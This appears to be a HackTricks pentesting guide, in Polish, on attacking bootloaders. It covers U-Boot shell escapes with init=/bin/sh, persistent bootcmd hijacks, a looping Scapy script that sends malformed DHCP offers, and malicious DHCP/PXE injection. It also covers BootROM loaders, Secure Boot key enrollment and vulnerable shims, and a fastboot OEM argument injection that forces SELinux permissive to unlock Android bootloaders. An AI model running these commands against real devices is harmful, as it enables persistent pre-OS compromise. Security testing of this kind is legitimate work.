# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane podczas modyfikowania konfiguracji uruchamiania urządzenia i testowania bootloaderów, takich jak U-Boot oraz loadery klasy UEFI. Skoncentruj się na uzyskaniu wczesnego wykonania kodu, ocenie zabezpieczeń podpisów i rollbacku oraz nadużywaniu ścieżek recovery lub network-boot.

Powiązane: MediaTek secure-boot bypass przez patchowanie bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Szybkie wygrane w U-Boot i nadużywanie środowiska

1. Uzyskaj dostęp do powłoki interpretera
- Podczas uruchamiania naciśnij znany klawisz przerwania (często dowolny klawisz, 0, spacja lub specyficzna dla płytki „magiczna” sekwencja), zanim wykona się `bootcmd`, aby przejść do promptu U-Boot.

2. Sprawdź stan uruchamiania i zmienne
- Przydatne polecenia:
- `printenv` (zrzut środowiska)
- `bdinfo` (informacje o płytce, adresy pamięci)
- `help bootm; help booti; help bootz` (obsługiwane metody uruchamiania kernela)
- `help ext4load; help fatload; help tftpboot` (dostępne loadery)

3. Zmodyfikuj argumenty uruchamiania, aby uzyskać root shell
- Dodaj `init=/bin/sh`, aby kernel przechodził do powłoki zamiast uruchamiać standardowy init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Uruchom system przez sieć z serwera TFTP
- Skonfiguruj sieć i pobierz kernel/obraz fit z sieci LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Utrwal zmiany za pomocą środowiska
- Jeśli pamięć środowiska nie jest chroniona przed zapisem, możesz utrwalić przejęcie kontroli:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd` i `boot_targets`, które wpływają na ścieżki fallback. Błędnie skonfigurowane wartości mogą umożliwiać wielokrotne przerywanie uruchamiania i przechodzenie do powłoki.

6. Sprawdź funkcje debug/unsafe
- Szukaj: `bootdelay` > 0, wyłączonego `autoboot`, nieograniczonego `usb start; fatload usb 0:1 ...`, możliwości użycia `loady`/`loads` przez port szeregowy, `env import` z niezaufanych nośników oraz kernelów/ramdysków ładowanych bez weryfikacji podpisu.

7. Testowanie obrazów U-Boot/weryfikacji
- Jeśli platforma deklaruje secure/verified boot z obrazami FIT, wypróbuj zarówno obrazy niepodpisane, jak i zmodyfikowane:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub zachowanie typu `verify=n` w trybie legacy często umożliwia uruchamianie dowolnych payloadów.
- Nie poprzestawaj na prostym wyniku allow/deny: najnowsze badania FIT wykazały, że sama ścieżka weryfikacji może być powierzchnią ataku pre-auth. Wykonuj negative-testy zewnętrznie przechowywanych danych FIT (`data-offset`, `data-position`, `data-size`), wyboru podpisanej konfiguracji, `loadables` oraz obsługi overlay / `extra-conf`.
- Jeśli masz pasujące drzewo źródeł, `test/vboot/vboot_test.sh` to szybki sposób na odtworzenie zachowania weryfikacji FIT w U-Boot sandbox przed użyciem rzeczywistego hardware.

8. Standard Boot (`bootstd`), `extlinux` i uruchamianie skryptów
- W nowoczesnych buildach U-Boot `bootcmd` jest często jedynie wrapperem wokół Standard Boot. Oznacza to, że zapisywalne nośniki, PXE lub pamięć SPI flash mogą stać się rzeczywistą granicą zaufania, nawet gdy widoczne środowisko wygląda nieszkodliwie.
- `extlinux` bootmeth wyszukuje `extlinux/extlinux.conf` w `/` i `/boot`; script bootmeth najpierw wyszukuje `boot.scr.uimg`, a następnie `boot.scr`. Podczas network boot nazwa skryptu może pochodzić z `boot_script_dhcp`.
- Przydatne polecenia triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Przypadki nadużyć do przetestowania: kontrolowane przez atakującego nośniki USB/SD znajdujące się wcześniej w `boot_targets`, zapisywalny `/boot/extlinux/extlinux.conf`, złośliwy TFTP dostarczający `boot.scr` lub wykonywanie skryptu z pamięci SPI za pomocą `script_offset_f`.
- Jeśli platforma polega na weryfikacji FIT, upewnij się, że konfiguracje są podpisane na poziomie konfiguracji, a nie tylko per-image; `required-mode=all` jest silniejsze niż akceptowanie dowolnego pojedynczego wymaganego klucza.

## Powierzchnia network-boot (DHCP/PXE) i złośliwe serwery

9. Fuzzing parametrów PXE/DHCP
- Obsługa legacy BOOTP/DHCP w U-Boot miała problemy z bezpieczeństwem pamięci. Przykładowo CVE‑2024‑42040 opisuje ujawnienie pamięci przez spreparowane odpowiedzi DHCP, które mogą wyciekać bajty z pamięci U-Boot z powrotem do sieci. Testuj ścieżki DHCP/PXE za pomocą zbyt długich i brzegowych wartości (opcja 67 bootfile-name, opcje vendor, pola file/servername) oraz obserwuj zawieszenia/leaki.
- Minimalny snippet Scapy do obciążenia parametrów uruchamiania podczas netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Sprawdź również, czy pola nazw plików PXE są przekazywane do logiki shell/loader bez sanityzacji, gdy są łączone ze skryptami provisioningowymi po stronie OS.

10. Testowanie command injection przez złośliwy serwer DHCP
- Skonfiguruj złośliwą usługę DHCP/PXE i spróbuj wstrzykiwać znaki do pól nazw plików lub opcji, aby dotrzeć do interpreterów poleceń w późniejszych etapach łańcucha uruchamiania. Dobrze sprawdzają się moduł pomocniczy DHCP w Metasploit, `dnsmasq` lub własne skrypty Scapy. Najpierw odizoluj sieć laboratoryjną.

## Tryby recovery SoC ROM, które omijają standardowe uruchamianie

Wiele SoC udostępnia tryb „loader” BootROM, który akceptuje kod przez USB/UART, nawet gdy obrazy flash są nieprawidłowe. Jeśli bezpieczne fuse’y secure-boot nie zostały wypalone, może to zapewnić dowolne wykonanie kodu bardzo wcześnie w łańcuchu.

- NXP i.MX (Serial Download Mode)
- Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
- Przykład: `imx-usb-loader u-boot.imx` w celu przesłania i uruchomienia własnego U-Boot z RAM.
- Allwinner (FEL)
- Narzędzie: `sunxi-fel`.
- Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Narzędzie: `rkdeveloptool`.
- Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` w celu załadowania loadera i przesłania własnego U-Boot.

Oceń, czy urządzenie ma wypalone eFuse/OTP secure-boot. Jeśli nie, tryby pobierania BootROM często omijają wszelką weryfikację wyższego poziomu (U-Boot, kernel, rootfs), wykonując pierwszy payload bezpośrednio z SRAM/DRAM.

## Bootloadery klasy UEFI/PC: szybkie kontrole

11. Testowanie modyfikacji ESP, rollbacku i rejestracji kluczy
- Zamontuj EFI System Partition (ESP) i sprawdź komponenty loadera: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` oraz ścieżki logo dostawcy.
- Gdy jest to możliwe, zrzutuj stan Secure Boot i bazy kluczy z OS:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Jeśli platforma działa w Setup Mode, akceptuje nieuwierzytelnioną rejestrację kluczy lub jest dostarczana z testowym/dom yślnym Platform Key (PKfail class), lokalny administrator lub atakujący z fizycznym dostępem może zarejestrować własne KEK/db i utrzymywać status Secure Boot jako „enabled”, jednocześnie uruchamiając dowolne pliki EFI.
- Spróbuj uruchamiać obniżone wersje lub znane podatne podpisane komponenty bootowania, jeśli revocations Secure Boot (dbx) nie są aktualne. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często można załadować własny kernel lub `grub.cfg` z ESP, aby uzyskać persistence.

12. Testowanie nieaktualnych shim, SBAT i revocations dbx
- Stare shimy podpisane przez Microsoft oraz forki dostawców mogą nadal stanowić ścieżkę bootkita w stylu BYOVD, jeśli revocations są nieaktualne. W odizolowanym labie umieść historycznie podatny shim na ESP i spróbuj chainloadować własny `grubx64.efi` lub kernel.
- Szybki triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Jeśli shim nadal się uruchamia mimo umieszczenia go na liście revocation, firmware/OS ma nieaktualne aktualizacje `dbx` lub ufa forkowanemu loaderowi, który nigdy nie odziedziczył zabezpieczeń SBAT z upstreamu.

13. Błędy parsowania boot logo (klasa LogoFAIL)
- W kilku firmware OEM/IBV występowały podatności związane z parsowaniem obrazów w DXE, które przetwarzają boot logo. Jeśli atakujący może umieścić spreparowany obraz na ESP w ścieżce zależnej od dostawcy (np. `\EFI\<vendor>\logo\*.bmp`) i ponownie uruchomić urządzenie, wykonanie kodu podczas wczesnego uruchamiania może być możliwe nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczane przez użytkownika oraz czy te ścieżki są zapisywalne z poziomu OS.


## Android/Qualcomm ABL + GBL (Android 16): luki w zaufaniu

Na urządzeniach z Android 16, które używają ABL do ładowania **Generic Bootloader Library (GBL)**, sprawdź, czy ABL **uwierzytelnia** aplikację UEFI ładowaną z partycji `efisp`. Jeśli ABL sprawdza jedynie **obecność** aplikacji UEFI i nie weryfikuje podpisów, primitive zapisu do `efisp` staje się **nieuwierzytelnionym wykonaniem kodu przed OS** podczas uruchamiania.

Praktyczne kontrole i ścieżki nadużyć:

- **Primitive zapisu do efisp**: potrzebujesz sposobu zapisania własnej aplikacji UEFI do `efisp` (root/usługa uprzywilejowana, błąd aplikacji OEM, ścieżka recovery/fastboot). Bez tego luka w ładowaniu GBL nie jest bezpośrednio osiągalna.
- **Wstrzykiwanie argumentów fastboot OEM** (błąd ABL): niektóre buildy akceptują dodatkowe tokeny w `fastboot oem set-gpu-preemption` i dołączają je do cmdline kernela. Można to wykorzystać do wymuszenia permissive SELinux, co umożliwia zapis do chronionych partycji:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Jeśli urządzenie ma poprawkę, polecenie powinno odrzucać dodatkowe argumenty.
- **Odblokowanie bootloadera przez trwałe flagi**: payload na etapie bootowania może zmienić trwałe flagi odblokowania (np. `is_unlocked=1`, `is_unlocked_critical=1`), emulując `fastboot oem unlock` bez kontroli serwera/zgody OEM. Po następnym restarcie jest to trwała zmiana stanu zabezpieczeń.

Uwagi defensywne/triage:

- Potwierdź, czy ABL wykonuje weryfikację podpisu payloadu GBL/UEFI z `efisp`. Jeśli nie, traktuj `efisp` jako powierzchnię persistence wysokiego ryzyka.
- Sprawdź, czy handlery fastboot OEM w ABL zostały poprawione tak, aby **weryfikować liczbę argumentów** i odrzucać dodatkowe tokeny.

## Ostrzeżenie dotyczące hardware

Zachowaj ostrożność podczas pracy z pamięcią flash SPI/NAND we wczesnej fazie uruchamiania (np. zwierania pinów w celu ominięcia odczytów) i zawsze konsultuj się z datasheetem pamięci flash. Zwarcia wykonane w niewłaściwym momencie mogą uszkodzić urządzenie lub programator.

## Uwagi i dodatkowe wskazówki

- Spróbuj użyć `env export -t ${loadaddr}` i `env import -t ${loadaddr}` do przenoszenia blobów środowiska między RAM a pamięcią masową; niektóre platformy umożliwiają import środowiska z nośników wymiennych bez uwierzytelniania.
- W celu uzyskania persistence w systemach opartych na Linuxie, które uruchamiają się przez `extlinux.conf`, często wystarczy zmodyfikować linię `APPEND` (aby wstrzyknąć `init=/bin/sh` lub `rd.break`) na partycji boot, gdy nie są wymuszane kontrole podpisów.
- Jeśli cel używa aktualizacji dual-slot / A/B, przejrzyj techniki anti-rollback i slot-desync w [przeglądzie analizy firmware](README.md), aby nie pominąć luk w zaufaniu występujących wyłącznie w updaterze, poza samym bootloaderem.
- Jeśli userland udostępnia `fw_printenv/fw_setenv`, sprawdź, czy `/etc/fw_env.config` odpowiada rzeczywistej pamięci środowiska. Błędnie skonfigurowane offsety umożliwiają odczyt/zapis do niewłaściwego regionu MTD.

## Odnośniki

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
